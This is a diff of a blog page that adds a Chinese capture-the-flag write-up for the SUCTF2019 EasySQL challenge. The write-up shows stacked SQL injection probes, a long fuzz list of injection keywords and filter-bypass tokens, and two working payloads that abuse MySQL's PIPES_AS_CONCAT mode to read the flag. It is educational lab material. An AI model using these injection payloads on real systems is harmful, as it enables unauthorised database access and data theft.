@@ -15,7 +15,7 @@
   <meta name="description" content>
   <meta name="author" content="chenxiyuan">
   <meta name="keywords" content>
-  <title>归档 ~ 晨曦远的博客</title>
+  <title>SUCTF2019 EasySQL记录 ~ 晨曦远的博客</title>
 
   <link rel="stylesheet" href="/newblog/lib/font-awesome/css/all.min.css">
 <link rel="stylesheet" href="/newblog/lib/bootstrap/css/bootstrap.min.css">
@@ -36,7 +36,7 @@
 
 
 <body>
-  <header style="height: 80vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -111,8 +111,8 @@
   </div>
 </nav>
 
-    <div class="view intro-2" id="background" parallax=true
-         style="background: url('/newblog/img/guidang.jpg')no-repeat center center;
+    <div class="view intro-2" id="background" false
+         style="background: url('/newblog/img/wenzhang.jpg')no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask rgba-black-light flex-center">
@@ -121,6 +121,41 @@
               
             </span>
 
+            
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  星期一, 三月 16日 2020, 9:26 上午
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    390 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      1 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
             
           </div>
 
@@ -132,53 +167,271 @@
 
   <main>
     
-      <div class="container nopadding-md">
-        <div class="py-5 z-depth-3" id="board">
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-<div class="list-group">
-  <p class="h4">共计 4 篇文章</p>
-  <hr>
-  
-    
       
-      <p class="h5">2020</p>
-    
-    <a href="/newblog/2020/03/16/SUCTF2019-EasySQL记录/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">SUCTF2019 EasySQL记录</span>
-      <span style="float: right;">03-16</span>
-    </a>
-  
-    
-    <a href="/newblog/2020/03/16/docker-Lychee搭建自己的图床/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">docker+Lychee搭建自己的图床</span>
-      <span style="float: right;">03-16</span>
-    </a>
-  
-    
-    <a href="/newblog/2020/03/15/记一次ctf校赛simple-xss出题/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">记一次ctf校赛simple_xss出题</span>
-      <span style="float: right;">03-15</span>
-    </a>
-  
-    
-    <a href="/newblog/2020/03/03/python3-aes实现/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">python3 aes实现</span>
-      <span style="float: right;">03-03</span>
-    </a>
-  
-</div>
 
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <p>先打开测试一下，有三种，分别是array，nonono，无回显。可以堆叠注入</p>
+<pre><code>1;show databases;
+1;show tables;
+</code></pre><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>fuzz,这里贴上一些关键字</p>
+<pre><code>length 
++
+handler
+like
+select 
+sleep
+database
+delete
+having
+or
+as
+-~
+BENCHMARK
+limit
+left
+select
+insert
+right
+#
+--+
+INFORMATION
+--
+;
+!
+%
++
+xor
+&lt;&gt;
+(
+&gt;
+&lt;
+)
+.
+^
+=
+AND
+BY
+CAST
+COLUMN
+COUNT
+CREATE
+END
+case
+&#39;1&#39;=&#39;1
+when
+admin&#39;
+&quot;
+length 
++
+length
+REVERSE
 
-              </div>
-            </div>
+ascii
+select 
+database
+left
+right
+union
+&quot;
+&amp;
+&amp;&amp;
+||
+oorr
+/
+//
+//*
+*/*
+/**/
+anandd
+GROUP
+HAVING
+IF
+INTO
+JOIN
+LEAVE
+LEFT
+LEVEL
+sleep
+LIKE
+NAMES
+NEXT
+NULL
+OF
+ON
+|
+infromation_schema
+user
+OR
+ORDER
+ORD
+SCHEMA
+SELECT
+SET
+TABLE
+THEN
+UNION
+UPDATE
+USER
+USING
+VALUE
+VALUES
+WHEN
+WHERE
+ADD
+AND
+prepare
+set
+update
+delete
+drop
+inset
+CAST
+COLUMN
+CONCAT
+GROUP_CONCAT
+group_concat
+CREATE
+DATABASE
+DATABASES
+alter
+DELETE
+DROP
+floor
+rand()
+information_schema.tables
+TABLE_SCHEMA
+%df
+concat_ws()
+concat
+LIMIT
+ORD
+ON
+extractvalue
+order 
+CAST()
+by
+ORDER
+OUTFILE
+RENAME
+REPLACE
+SCHEMA
+SELECT
+SET
+updatexml
+SHOW
+SQL
+TABLE
+THEN
+TRUE
+instr
+benchmark
+format
+bin
+substring
+ord
+
+UPDATE
+VALUES
+VARCHAR
+VERSION
+WHEN
+WHERE
+/*
+`
+
+,
+users
+%0a
+%0b
+mid
+for
+BEFORE
+REGEXP
+RLIKE
+in
+sys schemma
+SEPARATOR
+XOR
+CURSOR
+FLOOR
+sys.schema_table_statistics_with_buffer
+INFILE
+count
+%0c
+from
+%0d
+%a0
+=
+@
+else
+</code></pre><p>这里插一句，如果bp代理监听器勾选不上的话，可能是端口占用。先查找端口占用的进程<code>netstat -ano | findstr 8080</code>，再把这个进程关掉就好了。</p>
+<h2 id="sql-mode"><a href="#sql-mode" class="headerlink" title="sql_mode"></a>sql_mode</h2><p>sql_mode定义了MySQL应支持的SQL语法，以及应该在数据上执行何种确认检查，其中的<code>PIPES_AS_CONCAT</code>将<code>||</code>视为字符串的连接操作符而非 “或” 运算符。<br><img src="http://120.26.91.51:4001/uploads/big/1020ec590df5cd332773b760656b94e2.png" srcset="/newblog/img/loading.gif" alt="sql_mode"><br>这个模式下拼接字母会出错，只能拼接数字。</p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>这是一个堆叠注入</p>
+<pre><code>payload:1;set sql_mode=pipes_as_concat;select 1
+</code></pre><p>源码里的语句是<code>select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag</code>,现在就能够理解了。</p>
+<h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p><code>payload</code>:<code>*,1</code><br>拼接一下:<code>select *,1||flag from Flag</code>等同于<code>select *,1 from Flag</code></p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+              <span>
+                <i class="iconfont icon-inbox"></i>
+                
+                  <a class="hover-with-bg" href="/categories/web">web</a>
+                  &nbsp;
+                
+              </span>&nbsp;&nbsp;
+            
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/tags/sql">sql</a>
+                
+                  <a class="hover-with-bg" href="/tags/%E6%B3%A8%E5%85%A5">注入</a>
+                
+                  <a class="hover-with-bg" href="/tags/web">web</a>
+                
+              </span>
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
           </div>
         </div>
       </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+  </div>
+</div>
+
     
   </main>
 
@@ -257,6 +510,11 @@
 
 
 
+  
+    <script src="/newblog/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/newblog/js/post.js" ></script>
+
 
 
   <script src="/newblog/lib/smoothscroll/SmoothScroll.min.js" ></script>
@@ -297,7 +555,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "归档&nbsp;",
+        "SUCTF2019 EasySQL记录&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
